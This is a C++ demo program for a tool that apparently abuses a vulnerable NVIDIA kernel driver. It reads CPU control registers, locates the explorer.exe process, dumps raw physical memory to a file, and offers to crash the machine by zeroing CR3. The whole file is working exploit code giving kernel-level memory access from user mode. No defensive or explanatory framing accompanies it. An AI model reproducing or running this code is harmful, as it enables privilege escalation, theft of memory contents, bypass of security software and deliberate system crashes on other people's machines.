#include "NVDrv.h"
#include <fstream>

void WriteFileToDisk(const char* file_name, uintptr_t buffer, DWORD size)
{
	std::ofstream File(file_name, std::ios::binary);
	File.write((char*)buffer, size);
	File.close();
}

int main()
{
	NVDrv* NV = new NVDrv();

	DWORD CR0 = NV->ReadCr(NVDrv::NVControlRegisters::CR0);
	printf("CR0: %p\n", (void*)CR0);

	DWORD CR2 = NV->ReadCr(NVDrv::NVControlRegisters::CR2);
	printf("CR2: %p\n", (void*)CR2);

	DWORD CR3 = NV->ReadCr(NVDrv::NVControlRegisters::CR3);
	printf("CR3: %p\n", (void*)CR3);

	DWORD CR4 = NV->ReadCr(NVDrv::NVControlRegisters::CR4);
	printf("CR4: %p\n", (void*)CR4);

	uintptr_t ProcessBase = NV->GetProcessBase(L"explorer.exe");
	printf("ProcessBase: %p\n", (void*)ProcessBase);

	DWORD DumpSize = 0xFFFF;
	uintptr_t Allocation = (uintptr_t)VirtualAlloc(0, DumpSize, MEM_COMMIT, PAGE_READWRITE);

	for (int i = 0; i < (DumpSize / 8); i++)
		NV->ReadPhysicalMemory(i * 8, (uintptr_t*)(Allocation + i * 8), 8);

	WriteFileToDisk("PhysicalMemoryDump.bin", Allocation, DumpSize);

	if (Allocation)
		VirtualFree((void*)Allocation, 0, MEM_RELEASE);

	int Result = MessageBoxA(0, "BSOD via nulling CR3?", "Test", MB_YESNO);

	if (Result == IDYES)
		NV->WriteCr(NVDrv::NVControlRegisters::CR3, 0);

	/*
	// Disable KVA shadowing before continuing with this
	//
	auto SystemCR3 = NV->GetSystemCR3();
	printf("SystemCR3: %p\n", (void*)SystemCR3);

	auto ProcessCR3 = NV->GetProcessCR3(ProcessBase);
	printf("ProcessCR3: %p\n", (void*)ProcessCR3);

	*/

	Sleep(-1);
}
